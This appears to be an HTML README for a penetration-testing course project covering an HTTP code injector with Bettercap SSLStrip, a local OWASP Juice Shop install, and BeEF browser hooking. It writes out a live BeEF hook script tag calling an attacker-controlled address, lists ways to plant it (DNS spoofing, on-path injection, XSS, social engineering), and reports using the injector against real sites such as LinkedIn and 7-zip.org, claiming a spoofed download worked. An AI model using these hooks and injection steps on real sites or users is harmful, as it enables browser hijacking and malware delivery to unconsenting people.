<h3>CODE INJECTOR</h3>
Tested HTTPS Bettercap SSLStrip
<p>
    This script works fully with:  <b>http://testasp.vulnweb.com/</b>
    <br />
    <b>http://www.pentest-standard.org/</b>
    <br />
    <b>http://juice-shop.herokuapp.com/#/</b> But breaks the site stopping page load. 
    <h4>
        It does work other sites if you insert the code in an earlier tag.
    </h4>
    eg, head tag.  However, injecting code this early may also break page load.
    <br />

<h3>Testing Locally</h3>
    <h4>Separate script code_inj_https.py to deal with localhost testing...</h4>
        <p> Against OWASP Juice Shop:  <b>http://127.0.0.1:42000/#/</b>
        </p>
    <h4>Brief install guide, Juice Shop from Kali Linux terminal.</h4>
    <p>
        There is misinformation about how to do this.  
        <br/>
        eg, install Docker, install node, install npm, download from github.  
<br/>
        Installing any of these, some of which are very invasive, is unnecessary.
        <br/>
        Here is the painfree <b>Linux</b> version:
    </p>
    <ol>
        <li>From anywhere on your terminal command line
            <br />
            <b>sudo apt install juice-shop</b>
        </li>
        <li>When install is complete</li>
        <li><b>sudo juice-shop start</b></li>
        <li>Navigate to: <b>http://127.0.0.1:42000/#/</b>
    </ol>
<h4>Process</h4>
<ol>
    <li>
        Use setup_environment.py
    </li>
</ol>
<h3>Client Side Attacks.</h3>
    <h4>Beef Framework.</h4>
        <p>
            <b>Browser</b> Exploitation Framework allowing us to launch a number of attacks
            on a hooked target.
            <br />
            Targets are hooked once they load a hook url.
        </p>
        <ol>
            <li>DNS spoof requests to a page containing the hook</li>
            <li>Inject the hook in browsed pages (need to be onPath)</li>
            <li>Use XSS Exploit</li>
            <li>Social engineer the target to open a hook page.</li>
        </ol>
        <h4>Install BeEF</h4>
        <ol>
            <li>sudo apt update</li>
            <li>sudp apt upgrade</li>
            <li>sudo apt-get install beef-xss</li>
            <li>In apps,click <b>BeEF-xss</b> to start </li>
            <li>You will be prompted for a UN and a PW</li>
            <li>Navigate to <b>http://127.0.0.1:3000/ui/panel</b></li>
        </ol>
        <h4>Phishing for BeEF</h4>
        <h5>DNS Spoof, Code Inject or Social Engineer to get JS hook in page</h5>
        <p>First Example, for Kali Linux only</p>
        <ol>
            <li>Go to /var/www/html/, open index.html</li>
            <li>Make a backup of index.html, delete all, insert the hook:
                <br/>
                <p>This HTML file contains the BeEF Hook</p>
                Get your ip <b>ifconfig</b>
                <br/>
                <b><script src="http://<IP>:3000/hook.js"></script></b>
                <br/>
                <script src="http://192.168.63.139:3000/hook.js"></script>
                <br/>
                That's the only code you need for this example.
            </li>
            <li>Start your websever: <b>$ service apache2 start</b></li>
            <li>So now, when we load our index.html into the browser of a 
                <br/>
                local or a remote VM on our VN, the beef panel will update
                <br/>
                Check it out, explore the tabs
            </li>
            <li>
                Add the BeEF injection code to our code injector script.
            </li>
            <li>
                Tested works fine against Vulnweb.  After this, BeEF updates.
            </li>
        </ol>
    <h4>Most useful commands</h4>
        <ol>
            <li>
                Click on the target browser to bring up the GUI.
            </li>
                Select the commands tab.
            <li>
                Let's do a simple alert.
                <br/>
                Type alert into the search field.
                <li>
                    Select <b>Create alert dialog</b>
                </li>
                <li>
                    Select Execute
                </li>
            </li>
            <li></li>
        </ol>
<h4>Using Bettercap SSLStrip</h4>
Let's run code_injector against the following HTTPS sites, their SSLStripped,
<br/>
HTTP versions at least.
<ul>
<li>Linkedin.com</li>
<li>winzip.com</li>
<li>Try loading in the full address with http, this works with 
    http://7-zip.org - <b>Tested and worked to spoof download...</b>
    <br/>
    http://www.udemy.com/ - <b></b>
    <br/>
    You could try experimenting with a bunch more.
</li>
</ul>


